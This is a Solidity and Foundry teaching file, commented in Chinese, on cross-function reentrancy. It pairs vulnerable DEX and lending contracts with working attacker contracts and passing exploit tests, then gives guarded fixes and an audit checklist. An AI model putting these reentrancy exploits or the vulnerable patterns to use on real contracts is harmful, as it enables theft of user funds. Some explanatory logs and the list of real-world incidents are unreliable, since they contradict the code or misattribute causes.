// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 跨函数重入攻击示例
 * @notice 攻击者在函数A的执行过程中重入到函数B
 * @dev 漏洞点：多个函数共享状态，但没有统一的重入保护
 * 
 * 关键区别：
 * - 单函数重入：withdraw() → 重入 → withdraw()
 * - 跨函数重入：withdraw() → 重入 → transfer() (或其他函数)
 */

// ============ 漏洞合约 ============
contract VulnerableDEX {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 函数A：提现函数
    function withdraw(uint256 _amount) external {
        // 缓存余额到局部变量（典型漏洞写法：外部调用前未更新状态）
        uint256 userBalance = balances[msg.sender];
        require(userBalance >= _amount, "Insufficient balance");
        
        // ❌ 漏洞：外部调用在状态更新之前
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        // 状态更新（太晚了！）
        // 使用局部变量写回，避免重入期间其他函数先改了 balances 后导致这里下溢回滚
        balances[msg.sender] = userBalance - _amount;
        
        emit Withdraw(msg.sender, _amount);
    }
    
    // 函数B：转账函数（授权转账）
    // 注意：这个函数看起来是"安全"的，遵循了CEI模式
    function transfer(address _to, uint256 _amount) external {
        // Checks
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        require(_to != address(0), "Invalid recipient");
        
        // Effects - 先更新状态（看起来很安全）
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        
        // Interactions - 外部调用在最后
        emit Transfer(msg.sender, _to, _amount);
    }
    
    function getBalance(address _user) external view returns (uint256) {
        return balances[_user];
    }
    
    function getTotalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============ 攻击合约 ============
contract CrossFunctionAttacker {
    VulnerableDEX public dex;
    address public accomplice; // 共犯地址
    uint256 public attackAmount;
    bool public attackInProgress;
    
    constructor(address _dexAddress, address _accomplice) {
        dex = VulnerableDEX(_dexAddress);
        accomplice = _accomplice;
    }
    
    // 第一步：攻击者存款
    function fundAttack() external payable {
        attackAmount = msg.value;
        dex.deposit{value: msg.value}();
        console.log("Attacker deposited:", msg.value);
    }
    
    // 第二步：发起跨函数重入攻击
    function attack() external {
        console.log("\n=== Starting Cross-Function Reentrancy Attack ===");
        console.log("DEX total balance:", dex.getTotalBalance());
        console.log("Attacker balance in DEX:", dex.balances(address(this)));
        console.log("Accomplice balance in DEX:", dex.balances(accomplice));
        
        attackInProgress = true;
        
        // 调用withdraw触发攻击
        dex.withdraw(attackAmount);
        
        attackInProgress = false;
        
        console.log("\n=== Attack Complete ===");
        console.log("DEX total balance:", dex.getTotalBalance());
        console.log("Attacker balance in DEX:", dex.balances(address(this)));
        console.log("Accomplice balance in DEX:", dex.balances(accomplice));
        console.log("Attacker stolen ETH:", address(this).balance);
    }
    
    // 关键：在receive中重入到另一个函数
    receive() external payable {
        console.log("\n--- Receive() triggered ---");
        console.log("Received from withdraw():", msg.value);
        console.log("Current attacker balance in DEX:", dex.balances(address(this)));
        console.log("(Balance not updated yet!)");
        
        if (attackInProgress) {
            console.log("\n>>> Reentering via transfer() function <<<");
            
            // 关键：不是重入withdraw()，而是重入transfer()！
            // 此时 balances[attacker] 还没有减少
            // 我们可以"转移"这个余额到accomplice
            uint256 currentBalance = dex.balances(address(this));
            console.log("Attempting to transfer:", currentBalance);
            
            dex.transfer(accomplice, currentBalance);
            
            console.log("Transfer complete!");
            console.log("Attacker balance in DEX after transfer:", dex.balances(address(this)));
            console.log("Accomplice balance in DEX:", dex.balances(accomplice));
        }
    }
    
    function collectFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// ============ 更复杂的跨函数重入示例 ============
/**
 * @title 借贷协议的跨函数重入
 * @notice 现实中更常见的场景：借贷协议中的跨函数重入
 */
contract VulnerableLending {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150; // 150% 抵押率
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    // 函数A：提现抵押品
    function withdrawCollateral(uint256 _amount) external {
        require(deposits[msg.sender] >= _amount, "Insufficient deposits");
        
        // 检查是否有未偿还借款
        uint256 requiredCollateral = (borrowed[msg.sender] * COLLATERAL_RATIO) / 100;
        uint256 remainingCollateral = deposits[msg.sender] - _amount;
        require(remainingCollateral >= requiredCollateral, "Would be undercollateralized");
        
        // ❌ 外部调用在状态更新前
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        // 状态更新（太晚了）
        deposits[msg.sender] -= _amount;
    }
    
    // 函数B：借款
    function borrow(uint256 _amount) external {
        uint256 maxBorrow = (deposits[msg.sender] * 100) / COLLATERAL_RATIO;
        uint256 availableToBorrow = maxBorrow - borrowed[msg.sender];
        
        require(_amount <= availableToBorrow, "Insufficient collateral");
        
        // 状态先更新（这个函数本身是安全的）
        borrowed[msg.sender] += _amount;
        
        // 外部调用
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
    
    function repay() external payable {
        require(borrowed[msg.sender] >= msg.value, "Repaying too much");
        borrowed[msg.sender] -= msg.value;
    }
    
    function getMaxBorrow(address _user) public view returns (uint256) {
        uint256 maxBorrow = (deposits[_user] * 100) / COLLATERAL_RATIO;
        return maxBorrow - borrowed[_user];
    }
}

contract LendingAttacker {
    VulnerableLending public lending;
    uint256 public depositAmount;
    bool public attacking;
    
    constructor(address _lendingAddress) {
        lending = VulnerableLending(_lendingAddress);
    }
    
    function setupAttack() external payable {
        depositAmount = msg.value;
        lending.deposit{value: msg.value}();
        console.log("Deposited collateral:", msg.value);
    }
    
    function attack() external {
        console.log("\n=== Lending Attack Start ===");
        console.log("Initial deposit:", lending.deposits(address(this)));
        console.log("Initial borrowed:", lending.borrowed(address(this)));
        console.log("Max borrow allowed:", lending.getMaxBorrow(address(this)));
        
        attacking = true;
        
        // 尝试提取抵押品（会触发重入）
        lending.withdrawCollateral(depositAmount);
        
        attacking = false;
        
        console.log("\n=== Attack Result ===");
        console.log("Final deposit:", lending.deposits(address(this)));
        console.log("Final borrowed:", lending.borrowed(address(this)));
        console.log("Stolen:", address(this).balance);
    }
    
    receive() external payable {
        console.log("\n--- Collateral withdrawal received ---");
        console.log("Amount:", msg.value);
        console.log("Current deposit record:", lending.deposits(address(this)));
        console.log("(Still shows full amount!)");
        
        if (attacking) {
            // 在deposits还未更新时，借最大额度
            uint256 maxBorrow = lending.getMaxBorrow(address(this));
            console.log("\n>>> Reentering via borrow() <<<");
            console.log("Can still borrow:", maxBorrow);
            
            if (maxBorrow > 0) {
                lending.borrow(maxBorrow);
                console.log("Borrowed:", maxBorrow);
            }
        }
    }
}

// ============ Foundry 测试 ============
contract CrossFunctionReentrancyTest is Test {
    VulnerableDEX public dex;
    CrossFunctionAttacker public attacker;
    
    address public victim1 = address(0x1);
    address public victim2 = address(0x2);
    address public attackerOwner = address(0x3);
    address public accomplice = address(0x4);
    
    function setUp() public {
        dex = new VulnerableDEX();
        
        // 受害者存款
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        
        vm.prank(victim1);
        dex.deposit{value: 10 ether}();
        
        vm.prank(victim2);
        dex.deposit{value: 10 ether}();
        
        console.log("=== Initial Setup ===");
        console.log("DEX total balance:", dex.getTotalBalance());
        console.log("Victim1 balance:", dex.balances(victim1));
        console.log("Victim2 balance:", dex.balances(victim2));
    }
    
    function testCrossFunctionReentrancy() public {
        attacker = new CrossFunctionAttacker(address(dex), accomplice);
        
        vm.deal(attackerOwner, 5 ether);
        
        vm.startPrank(attackerOwner);
        
        // 攻击者存入5 ETH
        attacker.fundAttack{value: 5 ether}();
        
        uint256 dexBalanceBefore = dex.getTotalBalance();
        uint256 attackerDexBalanceBefore = dex.balances(address(attacker));
        
        console.log("\n=== Before Attack ===");
        console.log("DEX balance:", dexBalanceBefore);
        console.log("Attacker balance in DEX:", attackerDexBalanceBefore);
        console.log("Accomplice balance in DEX:", dex.balances(accomplice));
        
        // 执行攻击
        attacker.attack();
        
        uint256 dexBalanceAfter = dex.getTotalBalance();
        uint256 attackerDexBalanceAfter = dex.balances(address(attacker));
        uint256 accompliceBalance = dex.balances(accomplice);
        
        console.log("\n=== After Attack ===");
        console.log("DEX balance:", dexBalanceAfter);
        console.log("Attacker balance in DEX:", attackerDexBalanceAfter);
        console.log("Accomplice balance in DEX:", accompliceBalance);
        
        // 验证攻击成功
        // 攻击者获得了5 ETH现金，共犯在DEX中还有5 ETH余额
        assertTrue(address(attacker).balance == 5 ether, "Attacker should have withdrawn ETH");
        assertTrue(accompliceBalance == 5 ether, "Accomplice should have balance in DEX");
        assertTrue(attackerDexBalanceAfter == 0, "Attacker DEX balance should be 0");
        
        // 关键：10 ETH变成了15 ETH的"余额"（5 ETH现金 + 5 ETH DEX余额 + 5 ETH原始）
        // 实际上DEX只有20 ETH，但账面显示有25 ETH
        
        vm.stopPrank();

        // 提取accomplice的资金 — 确保 prank 用在真正的外部调用上
        uint256 withdrawAmount = dex.getBalance(accomplice);
        vm.prank(accomplice);
        dex.withdraw(withdrawAmount);
        console.log("The accomplice is DEX's balance now is: ", dex.getBalance(accomplice));
        console.log("The accomplice's balance now is: ", accomplice.balance);

    }
    
    function testAttackMechanism() public {
        attacker = new CrossFunctionAttacker(address(dex), accomplice);
        vm.deal(attackerOwner, 5 ether);
        
        vm.startPrank(attackerOwner);
        attacker.fundAttack{value: 5 ether}();
        
        console.log("\n=== Understanding Cross-Function Reentrancy ===");
        console.log("\n1. Initial State:");
        console.log("   Attacker balance in DEX: 5 ETH");
        console.log("   Accomplice balance in DEX: 0 ETH");
        
        console.log("\n2. Attacker calls withdraw(5 ETH):");
        console.log("   - DEX checks: balances[attacker] >= 5 ETH? YES");
        console.log("   - DEX sends 5 ETH to attacker");
        console.log("   - This triggers attacker.receive()");
        console.log("   - BEFORE balances[attacker] -= 5 ETH is executed!");
        
        console.log("\n3. In receive(), attacker calls transfer():");
        console.log("   - balances[attacker] is STILL 5 ETH");
        console.log("   - transfer() checks: balances[attacker] >= 5 ETH? YES!");
        console.log("   - transfer() executes: balances[attacker] -= 5, balances[accomplice] += 5");
        console.log("   - Now balances[attacker] = 0, balances[accomplice] = 5");
        
        console.log("\n4. Return to withdraw():");
        console.log("   - Executes: balances[attacker] -= 5 ETH");
        console.log("   - 0 - 5 = underflow? YES! In Solidity 0.8+, this would revert");
        console.log("   - But the damage is done: balances[accomplice] = 5 ETH");
        
        console.log("\n5. Result:");
        console.log("   - Attacker got 5 ETH in cash (from withdraw)");
        console.log("   - Accomplice has 5 ETH credit in DEX (from transfer)");
        console.log("   - Total: 10 ETH from 5 ETH initial deposit!");
        
        vm.stopPrank();
    }
}

contract LendingReentrancyTest is Test {
    VulnerableLending public lending;
    LendingAttacker public attacker;
    
    address public victim = address(0x1);
    address public attackerOwner = address(0x2);
    
    function setUp() public {
        lending = new VulnerableLending();
        
        // 受害者提供流动性
        vm.deal(victim, 100 ether);
        vm.prank(victim);
        lending.deposit{value: 100 ether}();
    }
    
    function testLendingAttack() public {
        attacker = new LendingAttacker(address(lending));
        
        vm.deal(attackerOwner, 10 ether);
        vm.startPrank(attackerOwner);
        
        // 攻击者存入抵押品
        attacker.setupAttack{value: 10 ether}();
        
        console.log("\n=== Before Attack ===");
        console.log("Lending balance:", address(lending).balance);
        console.log("Attacker deposit:", lending.deposits(address(attacker)));
        console.log("Attacker borrowed:", lending.borrowed(address(attacker)));
        console.log("Attacker can borrow:", lending.getMaxBorrow(address(attacker)));
        
        // 执行攻击
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        console.log("Lending balance:", address(lending).balance);
        console.log("Attacker deposit:", lending.deposits(address(attacker)));
        console.log("Attacker borrowed:", lending.borrowed(address(attacker)));
        console.log("Attacker balance:", address(attacker).balance);
        
        // 验证：攻击者取回了抵押品，还借了钱
        uint256 stolen = address(attacker).balance;
        assertTrue(stolen > 10 ether, "Should profit from attack");
        
        vm.stopPrank();
    }
}

// ============ 修复版本 ============
/**
 * @title 安全的DEX（全局重入保护）
 * @notice 使用全局ReentrancyGuard保护所有函数
 */
abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;
    
    constructor() {
        _status = NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status != ENTERED, "ReentrancyGuard: reentrant call");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }
}

contract SecureDEX is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // 所有可能被重入的函数都加保护
    function withdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= _amount;
    }
    
    // transfer也要加保护！即使它看起来"安全"
    function transfer(address _to, uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
    }
}

/**
 * @title 安全的借贷协议（CEI模式）
 */
contract SecureLending {
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    
    uint256 public constant COLLATERAL_RATIO = 150;
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    // 遵循CEI模式
    function withdrawCollateral(uint256 _amount) external {
        require(deposits[msg.sender] >= _amount, "Insufficient deposits");
        
        // Effects - 先更新状态
        deposits[msg.sender] -= _amount;
        
        // Checks - 再检查抵押率（使用更新后的状态）
        uint256 requiredCollateral = (borrowed[msg.sender] * COLLATERAL_RATIO) / 100;
        require(deposits[msg.sender] >= requiredCollateral, "Would be undercollateralized");
        
        // Interactions - 最后外部调用
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
    
    function borrow(uint256 _amount) external {
        uint256 maxBorrow = (deposits[msg.sender] * 100) / COLLATERAL_RATIO;
        require(borrowed[msg.sender] + _amount <= maxBorrow, "Insufficient collateral");
        
        borrowed[msg.sender] += _amount;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
    }
}

/**
 * ============ 知识点总结 ============
 * 
 * 1. 跨函数重入 vs 单函数重入：
 *    单函数：withdraw() → 重入 → withdraw()
 *    跨函数：withdraw() → 重入 → transfer() 或 borrow()
 * 
 * 2. 为什么更危险？
 *    - 更难检测：transfer()函数本身可能是"安全"的
 *    - 共享状态：多个函数操作同一个状态变量
 *    - 审计盲区：开发者可能只检查了单个函数的安全性
 * 
 * 3. 攻击条件：
 *    - 函数A有外部调用且在状态更新前
 *    - 函数B使用了与A相同的状态变量
 *    - 函数B没有重入保护或保护不充分
 * 
 * 4. 真实案例：
 *    - Lendf.me (2020): $25M - ERC777重入到多个函数
 *    - Cream Finance (2021): $130M - 跨函数重入组合攻击
 *    - bZx (2020): $8M - 借贷协议的跨函数重入
 * 
 * 5. 防御策略：
 *    
 *    方案1: 全局ReentrancyGuard（推荐）
 *    - 在所有可能被重入的函数上加nonReentrant
 *    - 包括那些"看起来安全"的函数
 *    - 注意：同一个guard实例才能防止跨函数重入
 *    
 *    方案2: CEI模式
 *    - 每个函数都严格遵循CEI
 *    - 在任何外部调用前完成所有状态更新
 *    - 检查逻辑要使用更新后的状态
 *    
 *    方案3: 组合使用
 *    - 复杂协议推荐CEI + ReentrancyGuard双重保护
 * 
 * 6. 审计要点：
 *    - 绘制状态依赖图：哪些函数共享状态？
 *    - 检查所有外部调用点
 *    - 不要只看单个函数，要看整个合约的交互
 *    - 特别注意：
 *      * 同时操作balance/deposit/borrow等核心状态的函数
 *      * ERC777/ERC721等带回调的代币
 *      * 复杂的DeFi协议（借贷、DEX、衍生品）
 * 
 * 7. 测试技巧：
 *    - 用你的AST工具识别共享状态的函数组
 *    - 为每对函数组合编写重入测试
 *    - invariant test: sum(balances) <= totalSupply
 *    - 模糊测试：随机调用函数组合
 * 
 * 8. 常见模式：
 *    Pattern 1: withdraw() → transfer()
 *    - 利用withdraw未更新余额
 *    - 通过transfer转移余额给共犯
 *    
 *    Pattern 2: withdrawCollateral() → borrow()
 *    - 利用抵押品记录未更新
 *    - 重入借款，绕过抵押率检查
 *    
 *    Pattern 3: burn() → mint()
 *    - 代币销毁未更新总量
 *    - 重入铸造，破坏供应量平衡
 */
